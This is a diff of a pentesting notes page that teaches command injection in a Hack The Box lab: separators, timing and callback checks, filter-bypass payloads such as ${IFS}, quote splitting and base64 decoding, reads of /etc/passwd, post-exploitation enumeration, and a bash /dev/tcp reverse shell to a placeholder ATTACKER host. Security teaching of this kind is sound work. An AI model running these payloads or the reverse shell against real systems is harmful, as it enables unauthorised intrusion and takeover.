@@ -1,11 +1,210 @@
 ---
-title: "Command Injection: Quick Reference"
+title: "Command Injection"
 sidebarTitle: "Command injection"
-description: "Look up command separators, input-filter examples, and ways to confirm blind command execution in the saved web notes."
+description: "Detect execution, preserve request encoding, choose shell-specific payloads, diagnose filters, and enumerate the resulting context."
 keywords: ["command injection", "cmdi", "shell separators", "ifs", "blind injection", "time delay", "filter bypass"]
 ---
 
 {/* Generated from Web/Command Injection.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Command injection becomes plausible when an application passes your input to a system utility: a host checker, document converter, archive tool, image processor, or administrative diagnostic. Your task is to identify the interpreter boundary, prove that a second command runs, and then determine the execution context.
+
+## Working sequence
+
+1. Use the feature normally and save its request and response.
+2. Identify the input used by the utility and whether browser validation prevents the request from being sent.
+3. Test one separator with a small identity command. Preserve the original argument where possible.
+4. If output is absent, compare timing or an explicitly identified callback.
+5. If a filter blocks the request, isolate the blocked character or word before choosing a bypass.
+6. Once execution is established, enumerate the user, OS, working directory, permissions, and network position.
+
+## Capture and replay the real request
+
+Examples below use a lab host checker with a POST field named `ip`. Replace the URL and field with the captured request; preserve its cookies, tokens, and other required fields.
+
+```bash
+BASE='http://app.htb'
+curl -sS -D baseline.headers -o baseline.html \
+  --data-urlencode 'ip=127.0.0.1' "$BASE/check.php"
+```
+
+In Burp, send a successful request to Repeater. If an invalid value produces a browser message but no network request, that is frontend validation. Edit the intercepted request to learn what the server actually accepts.
+
+```bash
+curl -sS --data-urlencode 'ip=127.0.0.1;whoami' "$BASE/check.php"
+curl -sS --data-urlencode 'ip=127.0.0.1&&whoami' "$BASE/check.php"
+```
+
+`--data-urlencode` preserves the field value through form encoding. Do not pre-encode a payload and then encode it again unintentionally. In a raw form body, `&` separates parameters: an intended shell `&&` normally needs `%26%26` on the wire.
+
+## Choose an operator that fits the shell
+
+These are **input values**, not commands to run on your workstation.
+
+| Input value | Why it may work | What can mislead you |
+| --- | --- | --- |
+| `127.0.0.1;id` | Run another command after the first | A semicolon is not a command separator in Windows cmd.exe |
+| `127.0.0.1&&id` | Run the second command after success | No second command if the original command fails |
+| `invalid-host\|\|id` | Run the second command after failure | A successful first command prevents the second |
+| `127.0.0.1\|id` | Pipe the first command into another process | Output behavior differs; the second program may ignore stdin |
+| `127.0.0.1%0aid` | Newline separator after URL decoding | `%0a` must become a newline at the intended decoding layer |
+| `127.0.0.1$(id)` | Command substitution in a compatible shell | Output becomes part of the original argument; it may appear in an error |
+
+For Windows, start with a suitable command and interpreter rather than translating Linux payloads mechanically:
+
+```text
+127.0.0.1&whoami
+127.0.0.1&&whoami
+invalid-host||whoami
+```
+
+If the value is quoted by the application, the separator may remain inside that argument. Determine the surrounding quote before testing an appropriate closing quote; the remaining application-generated suffix must still form valid syntax. Seeing a payload echoed is not proof that it ran.
+
+## Confirm execution when output is hidden
+
+### Repeated timing comparison
+
+Record multiple normal and delayed responses; a single slow request can be network noise. The following assumes a Linux shell and a synchronous server-side operation.
+
+```bash
+curl -sS -o /dev/null -w 'baseline: %{time_total}\n' \
+  --data-urlencode 'ip=127.0.0.1' "$BASE/check.php"
+curl -sS -o /dev/null -w 'delay: %{time_total}\n' \
+  --data-urlencode 'ip=127.0.0.1;sleep 3' "$BASE/check.php"
+```
+
+A repeatable additional delay supports execution. No delay is inconclusive if the job runs asynchronously, the request was rejected, or the tested interpreter lacks the command.
+
+### Callback with a fixed marker
+
+Use your lab VPN address and an available port. A fixed unique marker confirms a request without putting target data in the URL.
+
+```bash
+# On your workstation, in a directory containing no unrelated files:
+python3 -m http.server 8000 --bind 0.0.0.0
+```
+
+```text
+127.0.0.1;curl http://10.10.14.10:8000/cmdi-proof-01
+```
+
+Look for the marker in the listener log. A 404 response is fine for this proof: the relevant event is the incoming request. Failure can mean blocked egress, wrong callback address, or a missing `curl`, rather than a non-vulnerable input.
+
+## Diagnose a filter before bypassing it
+
+Compare the baseline, separator alone, a command without arguments, then a command with a space and argument. Note whether the response comes from the application or an upstream filter. Change one element at a time.
+
+### Spaces and argument separation
+
+```text
+127.0.0.1%0aid
+127.0.0.1%0acat%09/etc/passwd
+127.0.0.1;cat${IFS}/etc/passwd
+127.0.0.1;{cat,/etc/passwd}
+127.0.0.1;cat</etc/passwd
+```
+
+The tab form depends on URL decoding and accepted whitespace. `${IFS}` relies on shell expansion and word splitting. Brace expansion is a Bash feature, not a universal `/bin/sh` feature. Redirection supplies a file to stdin; it does not replace an arbitrary space in every command.
+
+### Blacklisted words
+
+Adjacent quoted fragments can assemble a command name in Unix shells:
+
+```bash
+w'h'o'am'i
+w"h"o"am"i
+w\ho\am\i
+```
+
+In cmd.exe, the caret has different escaping behavior:
+
+```text
+who^ami
+```
+
+Do not use these interchangeably. Test what interpreter is actually processing the input. In particular, putting backticks around letters runs a command substitution; it is not equivalent to inserting empty quotes.
+
+### Constructing a blocked character
+
+These examples require the indicated shell and a known environment value. Inspect the value before trusting an index copied from another machine.
+
+```bash
+# Bash: many PATH values begin with '/', but verify yours.
+printf '%s\n' "$PATH"
+printf '%s\n' "${PATH:0:1}"
+cat ${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+```powershell
+# PowerShell: inspect the value before selecting a character.
+$env:HOMEPATH
+$env:HOMEPATH[0]
+```
+
+### Transformations with explicit prerequisites
+
+Use these only after understanding the blocked syntax. Encoding does not repair a broken request or bypass every filter.
+
+```bash
+# Bash + rev: reconstruct a small identity command.
+$(rev<<<'imaohw')
+
+# Bash + base64: a local encoding example, followed by its decoding form.
+printf '%s' 'whoami' | base64
+bash<<<$(base64 -d<<<d2hvYW1p)
+```
+
+Here-strings (`<<<`) require a compatible shell. On PowerShell, its encoded-command convention uses UTF-16LE; do not substitute UTF-8 base64 blindly.
+
+```powershell
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
+powershell.exe -NoProfile -EncodedCommand $encoded
+```
+
+## Enumerate after a successful proof
+
+Run small commands separately so a failed command does not hide the useful output.
+
+```bash
+id
+whoami
+pwd
+uname -a
+ls -la
+ip address
+ip route
+```
+
+```powershell
+whoami
+whoami /priv
+hostname
+Get-Location
+Get-ChildItem
+ipconfig /all
+route print
+```
+
+Record the web-service identity and working directory. Continue with [Systems & Pivoting methodology](/pivoting/methodology) and [shell handling](/exploitation/shells-payloads-cheat-sheet) using the correct OS and connection direction.
+
+## Troubleshooting the result
+
+| Result | Next useful check |
+| --- | --- |
+| Literal payload is displayed | Distinguish reflection from a command's independently observable output |
+| `&&` fails but `;` works | Check the exit status or failure of the original operation |
+| Works in Bash locally, fails remotely | Identify `/bin/sh`, cmd.exe, PowerShell, quoting, and installed utilities |
+| Every modified input returns the same error | Separate operator filtering, whitespace filtering, and rejected value format |
+| Callback never arrives | Check listener, VPN address, egress, and the target-side HTTP client |
+| Extra parameters appear in the request | Encode form separators; inspect the raw request and decoded value |
+
+Keep the successful request, baseline, proof, user identity, and relevant constraint together. Prevention is to avoid shell construction where possible, use appropriate APIs, and validate input for the intended operation; a word blacklist is not a substitute.
+
+Source: synthesized from your supplied [Command Injections notes](/web/htb/command-injections), with the working sequence and explanations provided here for daily use.
+
+## Earlier notebook reference
+
+The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
 
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
@@ -40,3 +239,11 @@ bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'
 
 
 > Blind command injection: confirm with time delay (`; sleep 5`) or an out-of-band DNS/HTTP callback before assuming it failed.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Command Injections — full HTB module](/web/htb/command-injections) — Original lesson capture with the longer transcripts.
+
+{/* VAULT_RELATED_END */}
